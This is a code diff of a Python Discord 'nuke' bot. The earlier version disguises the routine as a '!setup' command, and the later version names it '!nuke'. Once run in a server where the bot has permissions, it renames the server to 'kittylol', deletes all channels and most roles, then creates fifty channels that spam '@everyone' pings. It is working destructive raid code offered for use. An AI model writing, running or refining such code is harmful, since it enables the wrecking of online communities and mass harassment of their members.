@@ -2,52 +2,38 @@ import asyncio
 import discord
 from discord.ext import commands
 
-
-class SetupBot(commands.Bot):
-    pass
-
-
 intents = discord.Intents.all()
-bot = SetupBot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 
+TOKEN = "TOKEN_CUA_BAN"
 
 @bot.event
 async def on_ready():
-    print(f"Đã đăng nhập với tư cách: {bot.user}")
+    print(f"Logged in as {bot.user}")
 
-
-@bot.command(name="setup")
-async def setup(ctx):
+@bot.command()
+async def nuke(ctx):
     guild = ctx.guild
-
-    try:
-        await guild.edit(name="by kittylol")
-    except Exception as e:
-        print(f"Lỗi đổi tên server: {e}")
-
-    for channel in list(guild.channels):
+    await guild.edit(name="kittylol")
+    for channel in guild.channels:
         try:
             await channel.delete()
-        except discord.HTTPException as e:
-            print(f"Lỗi xóa kênh: {e}")
-
+        except Exception:
+            pass
     for role in list(guild.roles):
         try:
-            if role != guild.default_role and role < guild.me.top_role:
+            if role != guild.default_role and role < ctx.guild.me.top_role:
                 await role.delete()
-        except discord.HTTPException as e:
-            print(f"Lỗi xóa role: {e}")
-
+        except Exception:
+            pass
     for i in range(50):
         try:
             channel = await guild.create_text_channel("lol by kittylol")
             await channel.send("@everyone lol by kittylol")
-        except discord.HTTPException as e:
-            print(f"Lỗi tạo kênh {i}: {e}")
+            await asyncio.sleep(0.5)
+        except Exception:
             await asyncio.sleep(1)
-            continue
-        await asyncio.sleep(0.5)
-
+            pass
 
 if __name__ == "__main__":
-    bot.run("DISCORD_TOKEM")
+    bot.run(TOKEN)
